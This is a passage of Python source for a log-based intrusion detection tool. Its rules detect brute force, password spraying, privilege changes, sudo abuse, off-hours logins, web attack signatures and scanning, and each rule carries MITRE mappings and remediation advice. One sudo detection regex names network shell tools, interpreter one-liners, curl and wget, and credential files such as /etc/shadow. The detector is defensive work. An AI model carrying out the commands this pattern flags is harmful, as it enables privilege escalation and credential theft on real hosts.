      AUTH-001  Vertical brute force  - one source, one/few accounts, many tries
      AUTH-002  Targeted account      - one account attacked from anywhere
      AUTH-003  Password spraying     - one source, many accounts, few tries each
                                        (deliberately stays under a per-account
                                        lockout threshold, so a naive
                                        failures-per-account rule misses it)
      AUTH-004  Distributed brute     - one account, many sources (botnet)
    """
    rule_id = "AUTH-001"
    name = "Brute force / credential attack"
    category = "authentication"

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.by_ip = SlidingWindow(cfg.fail_window, cfg.fail_threshold, cfg.max_evidence)
        self.by_user = SlidingWindow(cfg.fail_window, cfg.user_fail_threshold, cfg.max_evidence)
        self.spray = DistinctWindow(cfg.spray_window, cfg.spray_users, cfg.max_evidence)
        self.distributed = DistinctWindow(cfg.spray_window, cfg.distributed_ips, cfg.max_evidence)
        self.invalid_users = DistinctWindow(cfg.spray_window, cfg.invalid_user_threshold,
                                            cfg.max_evidence)
        self.ip_users: Dict[str, Counter] = defaultdict(Counter)
        self.ip_fail_total: Counter = Counter()

    def feed(self, ev: Event) -> None:
        if ev.action != "login_failure" or ev.outcome != "failure":
            return
        ip = ev.src_ip
        user = ev.user
        if ip and not self.cfg.is_allowed_ip(ip):
            self.by_ip.add(ip, ev)
            self.ip_fail_total[ip] += 1
            if user:
                self.ip_users[ip][user] += 1
                self.spray.add(ip, user.lower(), ev)
                if ev.extra.get("invalid_user"):
                    self.invalid_users.add(ip, user.lower(), ev)
        if user and not self.cfg.is_allowed_user(user):
            self.by_user.add(user.lower(), ev)
            if ip:
                self.distributed.add(user.lower(), ip, ev)

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        alerts: List[Alert] = []
        cfg = self.cfg

        # -- AUTH-001: failures per source IP --------------------------------
        for ip, rec in self.by_ip.bursts.items():
            peak = rec["peak"]
            total = self.ip_fail_total[ip]
            distinct_users = len(self.ip_users.get(ip, {}))
            severity = "HIGH"
            if peak >= cfg.fail_threshold * 4 or total >= cfg.fail_threshold * 10:
                severity = "CRITICAL"
            elif peak < cfg.fail_threshold * 2:
                severity = "MEDIUM"
            top_users = ", ".join(u for u, _ in self.ip_users.get(ip, Counter()).most_common(6)) or "n/a"
            alerts.append(Alert(
                rule_id="AUTH-001",
                title="Brute-force authentication attempt from single source",
                severity=severity,
                category=self.category,
                entity=ip, entity_type="ip",
                count=total,
                threshold=f">= {cfg.fail_threshold} failures in {cfg.fail_window}s "
                          f"(peak observed: {peak})",
                description=(
                    f"Source {ip} ({ip_kind(ip)}) generated {total} failed authentication "
                    f"attempts, peaking at {peak} failures inside a {cfg.fail_window}-second "
                    f"window against {distinct_users} distinct account(s). Sustained failure "
                    f"rates of this shape are characteristic of automated password guessing "
                    f"rather than human error. Accounts targeted: {top_users}."),
                recommendation=(
                    f"Block or rate-limit {ip} at the perimeter firewall; confirm fail2ban / "
                    f"account-lockout policy is active; verify none of the targeted accounts "
                    f"subsequently authenticated successfully (see AUTH-005)."),
                mitre="T1110 - Brute Force",
                first_seen=rec["first"], last_seen=rec["last"],
                evidence=rec["evidence"],
                related={"distinct_accounts": distinct_users, "peak_in_window": peak,
                         "accounts": list(self.ip_users.get(ip, {}))[:20]},
            ))

        # -- AUTH-002: failures per targeted account -------------------------
        for user, rec in self.by_user.bursts.items():
            alerts.append(Alert(
                rule_id="AUTH-002",
                title="Single account under sustained authentication attack",
                severity="HIGH" if rec["peak"] >= cfg.user_fail_threshold * 2 else "MEDIUM",
                category=self.category,
                entity=user, entity_type="user",
                count=rec["total"],
                threshold=f">= {cfg.user_fail_threshold} failures in {cfg.fail_window}s "
                          f"(peak observed: {rec['peak']})",
                description=(
                    f"Account '{user}' accumulated {rec['total']} failed authentications, "
                    f"peaking at {rec['peak']} within {cfg.fail_window} seconds. Concentrated "
                    f"pressure on one account suggests the attacker already believes the "
                    f"account exists and is valuable."),
                recommendation=(
                    f"Force a password reset for '{user}', enable MFA on the account, and "
                    f"review whether the account is privileged or externally exposed."),
                mitre="T1110.001 - Password Guessing",
                first_seen=rec["first"], last_seen=rec["last"],
                evidence=rec["evidence"],
                related={"peak_in_window": rec["peak"]},
            ))

        # -- AUTH-003: password spraying -------------------------------------
        for ip, rec in self.spray.hits.items():
            users = sorted(rec["values"])
            alerts.append(Alert(
                rule_id="AUTH-003",
                title="Password spraying - one source, many accounts",
                severity="CRITICAL" if len(users) >= cfg.spray_users * 3 else "HIGH",
                category=self.category,
                entity=ip, entity_type="ip",
                count=len(users),
                threshold=f">= {cfg.spray_users} distinct accounts in {cfg.spray_window}s "
                          f"(peak observed: {rec['peak']})",
                description=(
                    f"Source {ip} attempted authentication against {len(users)} distinct "
                    f"accounts within {cfg.spray_window} seconds. A low number of attempts "
                    f"spread across many accounts is the signature of password spraying, "
                    f"which is specifically designed to stay below per-account lockout "
                    f"thresholds. Accounts: {', '.join(users[:12])}"
                    f"{' ...' if len(users) > 12 else ''}."),
                recommendation=(
                    "Treat as an active credential attack. Block the source, audit every "
                    "listed account for a successful logon in the same window, and check "
                    "whether the account list matches a public directory or breach dump - "
                    "that would indicate prior reconnaissance."),
                mitre="T1110.003 - Password Spraying",
                first_seen=rec["first"], last_seen=rec["last"],
                evidence=rec["evidence"],
                related={"accounts": users[:40]},
            ))

        # -- AUTH-004: distributed attack on one account ---------------------
        for user, rec in self.distributed.hits.items():
            ips = sorted(rec["values"])
            alerts.append(Alert(
                rule_id="AUTH-004",
                title="Distributed brute force against a single account",
                severity="HIGH",
                category=self.category,
                entity=user, entity_type="user",
                count=len(ips),
                threshold=f">= {cfg.distributed_ips} distinct source IPs in {cfg.spray_window}s",
                description=(
                    f"Account '{user}' was targeted from {len(ips)} distinct source addresses "
                    f"inside {cfg.spray_window} seconds. Spreading attempts across many hosts "
                    f"defeats per-IP rate limiting and usually indicates a botnet or a proxy "
                    f"rotation service. Sources: {', '.join(ips[:10])}"
                    f"{' ...' if len(ips) > 10 else ''}."),
                recommendation=(
                    f"Per-IP blocking will not stop this pattern. Enforce MFA and account "
                    f"lockout on '{user}', and consider geo-fencing or conditional access "
                    f"policies for the account."),
                mitre="T1110 - Brute Force",
                first_seen=rec["first"], last_seen=rec["last"],
                evidence=rec["evidence"],
                related={"source_ips": ips[:40]},
            ))

        # -- AUTH-006: invalid-user (account) enumeration ---------------------
        for ip, rec in self.invalid_users.hits.items():
            names = sorted(rec["values"])
            alerts.append(Alert(
                rule_id="AUTH-006",
                title="Username enumeration using non-existent accounts",
                severity="MEDIUM",
                category=self.category,
                entity=ip, entity_type="ip",
                count=len(names),
                threshold=f">= {cfg.invalid_user_threshold} distinct invalid usernames "
                          f"in {cfg.spray_window}s",
                description=(
                    f"Source {ip} attempted {len(names)} usernames that do not exist on the "
                    f"host ({', '.join(names[:10])}{' ...' if len(names) > 10 else ''}). This "
                    f"is dictionary-driven account discovery, typically the reconnaissance "
                    f"phase preceding a real credential attack."),
                recommendation=(
                    "Confirm the service does not leak account existence through differing "
                    "error messages or response timing; block the source and monitor for a "
                    "follow-up attack using any account name that did resolve."),
                mitre="T1589.001 - Gather Victim Identity Information: Credentials",
                first_seen=rec["first"], last_seen=rec["last"],
                evidence=rec["evidence"],
                related={"attempted_usernames": names[:40]},
            ))
        return alerts


class CompromiseDetector(Detector):
    """
    AUTH-005 - a successful login preceded by a burst of failures.

    This is the single highest-value correlation in the whole tool: failures
    alone mean someone tried, but a success immediately after a failure burst
    means someone probably got in. It is evaluated stream-wise so ordering is
    respected: only failures that occurred *before* the success and inside the
    window count toward the threshold.
    """
    rule_id = "AUTH-005"
    name = "Successful authentication after failure burst"
    category = "authentication"

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.recent_failures: Dict[str, deque] = defaultdict(deque)
        self.findings: List[Dict[str, Any]] = []

    def feed(self, ev: Event) -> None:
        if ev.category != "auth":
            return
        keys = []
        if ev.src_ip:
            keys.append(f"ip:{ev.src_ip}")
        if ev.user:
            keys.append(f"user:{ev.user.lower()}")
        if not keys:
            return

        if ev.action == "login_failure":
            for key in keys:
                bucket = self.recent_failures[key]
                bucket.append((ev.order_key, ev))
                cutoff = ev.order_key - self.cfg.fail_window
                while bucket and bucket[0][0] < cutoff:
                    bucket.popleft()
        elif ev.action == "login_success":
            for key in keys:
                bucket = self.recent_failures[key]
                cutoff = ev.order_key - self.cfg.fail_window
                while bucket and bucket[0][0] < cutoff:
                    bucket.popleft()
                if len(bucket) >= self.cfg.success_after_fail:
                    self.findings.append({
                        "key": key,
                        "failures": len(bucket),
                        "success": ev,
                        "samples": [b[1] for b in list(bucket)[-3:]] + [ev],
                    })
                bucket.clear()          # reset so one success is reported once

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        # The same success is tracked under both an ip: and a user: key, so it
        # can be found twice. Collapse on the success event's own identity and
        # keep the larger failure count, otherwise the report shows the same
        # compromise twice and inflates the finding total.
        best: Dict[str, Dict[str, Any]] = {}
        for finding in self.findings:
            ev = finding["success"]
            identity = f"{ev.source_file}:{ev.line_no}:{ev.order_key}"
            current = best.get(identity)
            if current is None or finding["failures"] > current["failures"]:
                best[identity] = finding

        alerts: List[Alert] = []
        for finding in best.values():
            ev = finding["success"]
            entity = ev.src_ip or ev.user or "unknown"
            alerts.append(Alert(
                rule_id="AUTH-005",
                title="Successful login immediately following failed attempts",
                severity="CRITICAL",
                category=self.category,
                entity=entity,
                entity_type="ip" if ev.src_ip else "user",
                count=finding["failures"],
                threshold=f">= {self.cfg.success_after_fail} failures within "
                          f"{self.cfg.fail_window}s before the success",
                description=(
                    f"Account '{ev.user or 'unknown'}' authenticated successfully from "
                    f"{ev.src_ip or 'unknown source'} after {finding['failures']} failed "
                    f"attempts in the preceding {self.cfg.fail_window} seconds. This is the "
                    f"expected signature of a brute-force attack that succeeded, and should "
                    f"be treated as a suspected account compromise until disproven."),
                recommendation=(
                    f"ESCALATE. Disable or reset '{ev.user or 'the account'}' immediately, "
                    f"terminate its active sessions, and review everything that account did "
                    f"after {ev.when} for persistence, privilege escalation or data access."),
                mitre="T1078 - Valid Accounts",
                first_seen=finding["samples"][0].timestamp,
                last_seen=ev.timestamp,
                evidence=self.evidence_from(finding["samples"], self.cfg.max_evidence + 1),
                related={"account": ev.user, "source_ip": ev.src_ip,
                         "preceding_failures": finding["failures"]},
            ))
        return alerts


class PrivilegeDetector(Detector):
    """
    Privilege and account-lifecycle events.

    These are individually low-volume, which is exactly why a threshold on
    *count* is the wrong tool - one account creation at 03:00 matters more than
    a thousand ordinary logons. The rule therefore alerts on occurrence with a
    small threshold and leans on context (timing, actor) for severity.
    """
    rule_id = "PRIV-001"
    name = "Privilege and account lifecycle"
    category = "host"

    WATCHED = {
        "account_created": ("PRIV-001", "New account created", "HIGH",
                            "T1136 - Create Account"),
        "group_modified": ("PRIV-002", "Account added to privileged group", "HIGH",
                           "T1098 - Account Manipulation"),
        "privileged_logon": ("PRIV-003", "Special privileges assigned to logon", "MEDIUM",
                             "T1078.002 - Domain Accounts"),
        "log_cleared": ("PRIV-004", "Audit log cleared", "CRITICAL",
                        "T1070.001 - Clear Windows Event Logs"),
        "service_installed": ("PRIV-005", "New service installed", "HIGH",
                              "T1543.003 - Windows Service"),
        "account_lockout": ("PRIV-006", "Account lockout", "MEDIUM",
                            "T1110 - Brute Force"),
        "audit_policy_changed": ("PRIV-007", "Audit policy modified", "HIGH",
                                 "T1562.002 - Disable Windows Event Logging"),
        "account_deleted": ("PRIV-008", "Account deleted", "MEDIUM",
                            "T1531 - Account Access Removal"),
        "explicit_creds": ("PRIV-009", "Logon with explicit credentials", "LOW",
                           "T1078 - Valid Accounts"),
        "task_created": ("PRIV-010", "Scheduled task created", "MEDIUM",
                         "T1053.005 - Scheduled Task"),
    }

    RECOMMENDATIONS = {
        "PRIV-001": ("Verify the account was created through an approved change request. "
                     "Unplanned account creation immediately after a compromise indicator "
                     "is a persistence mechanism."),
        "PRIV-002": ("Confirm the group membership change was authorized. Additions to "
                     "Administrators, Domain Admins, sudo or wheel grant full control of "
                     "the host and are a standard privilege-escalation step."),
        "PRIV-003": ("Correlate with the logon that preceded it. Special privileges "
                     "assigned to an interactive logon from an unusual source warrants "
                     "review."),
        "PRIV-004": ("Treat as anti-forensics. An attacker clearing the audit log is "
                     "destroying the evidence of everything that came before it. Preserve "
                     "any remaining logs, pull the forwarded copies from the SIEM, and "
                     "begin incident response."),
        "PRIV-005": ("Inspect the service binary path and signature. Service installation "
                     "is one of the most common Windows persistence techniques."),
        "PRIV-006": ("Lockouts are the visible consequence of a brute-force attempt - "
                     "correlate with AUTH-001/AUTH-003 findings for the same account."),
        "PRIV-007": ("Audit policy changes reduce future visibility. Restore the baseline "
                     "policy and determine who made the change."),
        "PRIV-008": ("Confirm the deletion was authorized; deletion can be used to destroy "
                     "evidence of an attacker-created account."),
        "PRIV-009": ("Explicit credential use (runas) is normal for administrators but is "
                     "also used for lateral movement - check the target account and host."),
        "PRIV-010": ("Scheduled tasks are a persistence mechanism; review the task action "
                     "and the account it runs as."),
    }

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.groups: Dict[str, List[Event]] = defaultdict(list)

    def feed(self, ev: Event) -> None:
        if ev.action in self.WATCHED:
            self.groups[ev.action].append(ev)

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        alerts: List[Alert] = []
        for action, events in self.groups.items():
            rule_id, title, severity, mitre = self.WATCHED[action]
            if action == "account_lockout" and len(events) < self.cfg.lockout_threshold:
                continue
            # Privileged-group changes involving admin groups are escalated.
            detail_bits: List[str] = []
            escalate = False
            for ev in events:
                group = str(ev.extra.get("group", "")) + " " + ev.message
                if re.search(r'\b(?:domain admins|enterprise admins|administrators|sudo|wheel|root)\b',
                             group, re.IGNORECASE):
                    escalate = True
            if escalate and action == "group_modified":
                severity = "CRITICAL"

            actors = Counter(ev.user for ev in events if ev.user)
            sources = Counter(ev.src_ip for ev in events if ev.src_ip)
            if actors:
                detail_bits.append("accounts: " + ", ".join(a for a, _ in actors.most_common(6)))
            if sources:
                detail_bits.append("sources: " + ", ".join(s for s, _ in sources.most_common(6)))

            alerts.append(Alert(
                rule_id=rule_id,
                title=title,
                severity=severity,
                category=self.category,
                entity=(next(iter(actors)) if len(actors) == 1
                        else f"{len(events)} event(s)"),
                entity_type="user" if len(actors) == 1 else "global",
                count=len(events),
                threshold="occurrence-based (any observation is reportable)",
                description=(
                    f"{len(events)} '{action.replace('_', ' ')}' event(s) were observed"
                    + (f" ({'; '.join(detail_bits)})" if detail_bits else "")
                    + ". Security-relevant configuration and identity changes are reported "
                      "on occurrence because their impact does not scale with volume."),
                recommendation=self.RECOMMENDATIONS.get(rule_id, "Review and validate."),
                mitre=mitre,
                first_seen=min((e.timestamp for e in events if e.timestamp), default=None),
                last_seen=max((e.timestamp for e in events if e.timestamp), default=None),
                evidence=self.evidence_from(events, self.cfg.max_evidence),
                related={"accounts": list(actors)[:20], "sources": list(sources)[:20]},
            ))
        return alerts


class SudoAbuseDetector(Detector):
    """SUDO-001 - repeated sudo authentication failures and risky sudo commands."""
    rule_id = "SUDO-001"
    name = "Sudo abuse"
    category = "host"

    RISKY = re.compile(
        r'(?:/bin/(?:ba)?sh|/bin/dash|\bsu\b|passwd\s|useradd|usermod|visudo|chmod\s+(?:777|\+s)'
        r'|/etc/(?:shadow|sudoers)|nc\s|ncat|socat|python[\d.]*\s+-c|perl\s+-e|curl\s|wget\s)',
        re.IGNORECASE)

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.failures: Counter = Counter()
        self.failure_events: Dict[str, List[Event]] = defaultdict(list)
        self.risky_commands: List[Event] = []

    def feed(self, ev: Event) -> None:
        if ev.action == "sudo_failure":
            key = ev.user or ev.src_ip or "unknown"
            self.failures[key] += 1
            self.failure_events[key].append(ev)
        elif ev.action == "sudo_command":
            command = str(ev.extra.get("command", ""))
            if self.RISKY.search(command):
                self.risky_commands.append(ev)

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        alerts: List[Alert] = []
        for user, count in self.failures.items():
            if count < self.cfg.sudo_fail_threshold:
                continue
            events = self.failure_events[user]
            alerts.append(Alert(
                rule_id="SUDO-001",
                title="Repeated sudo authentication failures",
                severity="MEDIUM" if count < self.cfg.sudo_fail_threshold * 3 else "HIGH",
                category=self.category,
                entity=user, entity_type="user", count=count,
                threshold=f">= {self.cfg.sudo_fail_threshold} sudo failures",
                description=(
                    f"'{user}' failed sudo authentication {count} time(s). Repeated failures "
                    f"may indicate an unauthorized user attempting privilege escalation with "
                    f"a compromised but under-privileged account."),
                recommendation=("Verify the activity with the account owner; confirm the "
                                "account is meant to have sudo rights at all, and review "
                                "the sudoers policy for over-broad grants."),
                mitre="T1548.003 - Sudo and Sudo Caching",
                first_seen=min((e.timestamp for e in events if e.timestamp), default=None),
                last_seen=max((e.timestamp for e in events if e.timestamp), default=None),
                evidence=self.evidence_from(events, self.cfg.max_evidence),
            ))
        if self.risky_commands:
            commands = [truncate(str(e.extra.get("command", "")), 100)
                        for e in self.risky_commands]
            alerts.append(Alert(
                rule_id="SUDO-002",
                title="High-risk command executed via sudo",
                severity="HIGH",
                category=self.category,
                entity=self.risky_commands[0].user or "unknown", entity_type="user",
                count=len(self.risky_commands),
                threshold="occurrence-based (matched high-risk command pattern)",
                description=(
                    f"{len(self.risky_commands)} sudo invocation(s) matched high-risk command "
                    f"patterns (interactive shells, credential files, account management or "
                    f"network utilities): {'; '.join(commands[:4])}. Escalating to a root "
                    f"shell through sudo defeats command-level auditing for everything that "
                    f"follows."),
                recommendation=("Confirm each command with the operator. Restrict sudoers "
                                "entries so they cannot spawn interactive shells, and log "
                                "sudo I/O where the policy allows."),
                mitre="T1548.003 - Sudo and Sudo Caching",
                first_seen=min((e.timestamp for e in self.risky_commands if e.timestamp), default=None),
                last_seen=max((e.timestamp for e in self.risky_commands if e.timestamp), default=None),
                evidence=self.evidence_from(self.risky_commands, self.cfg.max_evidence),
            ))
        return alerts


class OffHoursDetector(Detector):
    """TIME-001 - successful authentication outside defined business hours."""
    rule_id = "TIME-001"
    name = "Off-hours authentication"
    category = "authentication"

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.by_user: Dict[str, List[Event]] = defaultdict(list)

    def feed(self, ev: Event) -> None:
        if ev.action != "login_success" or ev.timestamp is None:
            return
        if self.cfg.is_allowed_user(ev.user):
            return
        hour = ev.timestamp.hour
        weekend = ev.timestamp.weekday() >= 5
        if weekend or hour < self.cfg.business_start_hour or hour >= self.cfg.business_end_hour:
            self.by_user[ev.user or ev.src_ip or "unknown"].append(ev)

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        alerts: List[Alert] = []
        for user, events in self.by_user.items():
            if len(events) < self.cfg.off_hours_threshold:
                continue
            times = sorted({e.timestamp.strftime("%a %H:%M") for e in events if e.timestamp})
            alerts.append(Alert(
                rule_id="TIME-001",
                title="Authentication outside business hours",
                severity="MEDIUM" if len(events) > 2 else "LOW",
                category=self.category,
                entity=user, entity_type="user", count=len(events),
                threshold=(f"successful logon outside "
                           f"{self.cfg.business_start_hour:02d}:00-"
                           f"{self.cfg.business_end_hour:02d}:00 on a weekday"),
                description=(
                    f"'{user}' authenticated successfully {len(events)} time(s) outside "
                    f"business hours ({', '.join(times[:6])}"
                    f"{' ...' if len(times) > 6 else ''}). Off-hours access is not malicious "
                    f"by itself, but attackers prefer windows with no one watching, so it "
                    f"is a useful weak signal when combined with other findings."),
                recommendation=("Confirm the access against on-call schedules or change "
                                "windows. If unexplained, review the session's activity and "
                                "the source address."),
                mitre="T1078 - Valid Accounts",
                first_seen=min((e.timestamp for e in events if e.timestamp), default=None),
                last_seen=max((e.timestamp for e in events if e.timestamp), default=None),
                evidence=self.evidence_from(events, self.cfg.max_evidence),
            ))
        return alerts


# ===========================================================================
# SECTION 13 - WEB APPLICATION DETECTORS
# ===========================================================================
class WebAttackDetector(Detector):
    """
    WEB-001 - payload signature matching against request URIs, referrers and
    user-agent strings.

    Signatures are applied to the *decoded* URI so that percent-encoded and
    double-encoded payloads are caught; the raw line is still what gets stored
    as evidence so the analyst sees exactly what was on the wire.
    """
    rule_id = "WEB-001"
    name = "Web application attack signature"
    category = "web"

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.hits: Dict[str, Dict[str, Any]] = {}
        self.rare_methods: Dict[str, List[Event]] = defaultdict(list)

    def feed(self, ev: Event) -> None:
        if ev.category != "web":
            return
        if ev.method and ev.method.upper() in RARE_HTTP_METHODS:
            self.rare_methods[ev.method.upper()].append(ev)
        haystack = " ".join(filter(None, [
            ev.uri_decoded or ev.uri or "",
            unquote_plus(ev.referrer or ""),
            ev.user_agent or "",
            ev.message if ev.source_type in ("apache_error", "nginx_error") else "",
        ]))
        if not haystack.strip():
            return
        for sig_name, pattern, severity, mitre in WEB_ATTACK_SIGNATURES:
            if not pattern.search(haystack):
                continue
            key = f"{sig_name}|{ev.src_ip or 'unknown'}"
            record = self.hits.setdefault(key, {
                "signature": sig_name, "severity": severity, "mitre": mitre,
                "ip": ev.src_ip or "unknown", "count": 0, "events": [],
                "first": ev.timestamp, "last": ev.timestamp, "uris": set(),
            })
            record["count"] += 1
            record["last"] = ev.timestamp or record["last"]
            if record["first"] is None:
                record["first"] = ev.timestamp
            if len(record["events"]) < 20:
                record["events"].append(ev)
            if ev.uri:
                record["uris"].add(truncate(ev.uri, 160))

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        alerts: List[Alert] = []
        for record in self.hits.values():
            if record["count"] < self.cfg.web_attack_threshold:
                continue
            if self.cfg.is_allowed_ip(record["ip"]):
                continue
            severity = record["severity"]
            # Volume escalates confidence: one hit may be a false positive from a
            # legitimate query string, dozens is an active campaign.
            if record["count"] >= 10 and SEVERITY_RANK[severity] < SEVERITY_RANK["CRITICAL"]:
                severity = SEVERITIES[min(len(SEVERITIES) - 1, SEVERITY_RANK[severity] + 1)]
            successful = [e for e in record["events"] if e.status and 200 <= e.status < 300]
            success_note = ""
            if successful:
                severity = "CRITICAL"
                success_note = (f" {len(successful)} of the sampled malicious requests returned "
                                f"a 2xx status code, meaning the application processed them "
                                f"rather than rejecting them - treat as a possible successful "
                                f"exploitation.")
            alerts.append(Alert(
                rule_id="WEB-001",
                title=f"Web attack signature: {record['signature']}",
                severity=severity,
                category=self.category,
                entity=record["ip"], entity_type="ip", count=record["count"],
                threshold=f">= {self.cfg.web_attack_threshold} signature match(es)",
                description=(
                    f"Source {record['ip']} sent {record['count']} request(s) matching the "
                    f"'{record['signature']}' signature. Sample targets: "
                    f"{'; '.join(list(record['uris'])[:3])}.{success_note}"),
                recommendation=(
                    "Validate the affected endpoint against the payload class - parameterized "
                    "queries for injection, output encoding for XSS, canonicalization and "
                    "allow-listing for traversal. Block the source and, if any request "
                    "succeeded, treat the application as potentially compromised."),
                mitre=record["mitre"],
                first_seen=record["first"], last_seen=record["last"],
                evidence=self.evidence_from(record["events"], self.cfg.max_evidence),
                related={"signature": record["signature"],
                         "sample_uris": list(record["uris"])[:10],
                         "successful_responses": len(successful)},
            ))

        for method, events in self.rare_methods.items():
            severity = "MEDIUM" if method in ("TRACE", "TRACK", "CONNECT", "DEBUG") else "LOW"
            ips = Counter(e.src_ip for e in events if e.src_ip)
            alerts.append(Alert(
                rule_id="WEB-002",
                title=f"Unusual HTTP method observed: {method}",
                severity=severity,
                category=self.category,
                entity=method, entity_type="uri", count=len(events),
                threshold="method outside the expected GET/POST/HEAD set",
                description=(
                    f"{len(events)} request(s) used the {method} method from "
                    f"{len(ips)} source(s). Methods such as TRACE, CONNECT, PUT and "
                    f"WebDAV verbs are rarely required by modern applications and are "
                    f"commonly probed for cross-site tracing, open-proxy abuse or "
                    f"arbitrary file upload."),
                recommendation=(f"Disable {method} at the web server or WAF unless a "
                                f"documented application requirement exists."),
                mitre="T1595.002 - Vulnerability Scanning",
                first_seen=min((e.timestamp for e in events if e.timestamp), default=None),
                last_seen=max((e.timestamp for e in events if e.timestamp), default=None),
                evidence=self.evidence_from(events, self.cfg.max_evidence),
                related={"sources": [ip for ip, _ in ips.most_common(10)]},
            ))
        return alerts


class ScanningDetector(Detector):
    """
    WEB-003/004/005 - reconnaissance and abuse patterns visible in status codes
    and client identification rather than in payloads.
    """
    rule_id = "WEB-003"
    name = "Scanning and enumeration"
    category = "web"

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.error_burst = SlidingWindow(cfg.http_error_window, cfg.http_error_threshold,
                                         cfg.max_evidence)
        self.not_found = DistinctWindow(cfg.http_error_window * 10, cfg.enum_404_threshold,
                                        cfg.max_evidence)
        self.server_errors = SlidingWindow(cfg.http_error_window, cfg.server_error_threshold,
                                           cfg.max_evidence)
        self.agents: Dict[str, Dict[str, Any]] = {}

    def feed(self, ev: Event) -> None:
        if ev.category != "web":
            return
        ip = ev.src_ip
        if ip and ev.status and not self.cfg.is_allowed_ip(ip):
            if 400 <= ev.status < 500:
                self.error_burst.add(ip, ev)
            if ev.status == 404 and ev.uri:
                self.not_found.add(ip, ev.uri.split("?")[0][:200], ev)
        if ev.status and ev.status >= 500:
            self.server_errors.add("global", ev)

        if ev.user_agent is not None and ip and not self.cfg.is_allowed_ip(ip):
            agent = ev.user_agent.strip()
            for label, pattern, severity in SUSPICIOUS_AGENTS:
                if not pattern.search(agent):
                    continue
                key = f"{label}|{ip}"
                record = self.agents.setdefault(key, {
                    "label": label, "severity": severity, "ip": ip, "agent": agent,
                    "count": 0, "events": [], "first": ev.timestamp, "last": ev.timestamp,
                })
                record["count"] += 1
                record["last"] = ev.timestamp or record["last"]
                if record["first"] is None:
                    record["first"] = ev.timestamp
                if len(record["events"]) < 10:
                    record["events"].append(ev)
                break

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        alerts: List[Alert] = []
        cfg = self.cfg

        for ip, rec in self.error_burst.bursts.items():
            alerts.append(Alert(
                rule_id="WEB-003",
                title="Client error burst - probable automated scanning",
                severity="HIGH" if rec["peak"] >= cfg.http_error_threshold * 2 else "MEDIUM",
                category=self.category,
                entity=ip, entity_type="ip", count=rec["total"],
                threshold=f">= {cfg.http_error_threshold} 4xx responses in "
                          f"{cfg.http_error_window}s (peak: {rec['peak']})",
                description=(
                    f"Source {ip} triggered a burst of {rec['peak']} client-error responses "
                    f"inside {cfg.http_error_window} seconds. Human browsing produces "
                    f"occasional 404s; a dense burst of them is a scanner walking a wordlist."),
                recommendation=("Rate-limit or block the source. If the errors are 401/403, "
                                "check whether any request in the same window succeeded."),
                mitre="T1595 - Active Scanning",
                first_seen=rec["first"], last_seen=rec["last"], evidence=rec["evidence"],
                related={"peak_in_window": rec["peak"]},
            ))

        for ip, rec in self.not_found.hits.items():
            paths = sorted(rec["values"])
            alerts.append(Alert(
                rule_id="WEB-004",
                title="Directory / content enumeration",
                severity="HIGH" if len(paths) >= cfg.enum_404_threshold * 3 else "MEDIUM",
                category=self.category,
                entity=ip, entity_type="ip", count=len(paths),
                threshold=f">= {cfg.enum_404_threshold} distinct 404 paths",
                description=(
                    f"Source {ip} requested {len(paths)} distinct non-existent paths. "
                    f"Examples: {', '.join(paths[:6])}"
                    f"{' ...' if len(paths) > 6 else ''}. This is directory brute forcing - "
                    f"the attacker is mapping hidden admin panels, backups and config files."),
                recommendation=("Block the source and confirm that no sensitive path in the "
                                "wordlist actually exists. Ensure directory listing is off "
                                "and that backup/config files are not web-reachable."),
                mitre="T1595.003 - Wordlist Scanning",
                first_seen=rec["first"], last_seen=rec["last"], evidence=rec["evidence"],
                related={"sample_paths": paths[:25], "distinct_paths": len(paths)},
            ))

        for record in self.agents.values():
            if record["severity"] == "LOW" and record["count"] < 20:
                continue          # scripted clients are only interesting in bulk
            alerts.append(Alert(
                rule_id="WEB-005",
                title=f"Suspicious client identification: {record['label']}",
                severity=record["severity"],
                category=self.category,
                entity=record["ip"], entity_type="ip", count=record["count"],
                threshold="user-agent matched a known tool / anomaly signature",
                description=(
                    f"Source {record['ip']} issued {record['count']} request(s) presenting the "
                    f"user-agent \"{truncate(record['agent'] or '(empty)', 120)}\", which "
                    f"matches {record['label']}. Note that the user-agent header is fully "
                    f"attacker-controlled, so its absence proves nothing - but a tool that "
                    f"announces itself indicates an unskilled or unconcerned operator."),
                recommendation=("Block the source. Treat every request from this session as "
                                "hostile and review what the tool successfully reached."),
                mitre="T1595.002 - Vulnerability Scanning",
                first_seen=record["first"], last_seen=record["last"],
                evidence=self.evidence_from(record["events"], self.cfg.max_evidence),
                related={"user_agent": record["agent"]},
            ))

        for _key, rec in self.server_errors.bursts.items():
            alerts.append(Alert(
                rule_id="WEB-006",
                title="Server error burst",
                severity="MEDIUM",
                category=self.category,
                entity="web service", entity_type="global", count=rec["total"],
                threshold=f">= {cfg.server_error_threshold} 5xx responses in "
                          f"{cfg.http_error_window}s (peak: {rec['peak']})",
                description=(
                    f"The service returned {rec['peak']} server errors within "
                    f"{cfg.http_error_window} seconds. A 5xx burst is either an availability "
                    f"incident or the visible side effect of an exploit attempt crashing a "
                    f"code path (injection, deserialization, buffer handling)."),
                recommendation=("Correlate the burst window against WEB-001 findings and the "
                                "application error log to determine whether the cause is a "
                                "fault or an attack."),
                mitre="T1499 - Endpoint Denial of Service",
                first_seen=rec["first"], last_seen=rec["last"], evidence=rec["evidence"],
            ))
        return alerts


# ===========================================================================
# SECTION 14 - VOLUME, TIMING AND SOURCE-REPUTATION DETECTORS
# ===========================================================================
class TrafficSpikeDetector(Detector):
    """
    VOL-001 - global traffic spikes detected with a robust outlier test.

    Events are bucketed into fixed intervals and each bucket's volume is scored
    with a modified z-score built on the median and MAD.  A mean/stdev test
    fails here because a large spike drags the mean upward and inflates the
    standard deviation, so the spike partially conceals itself; median-based
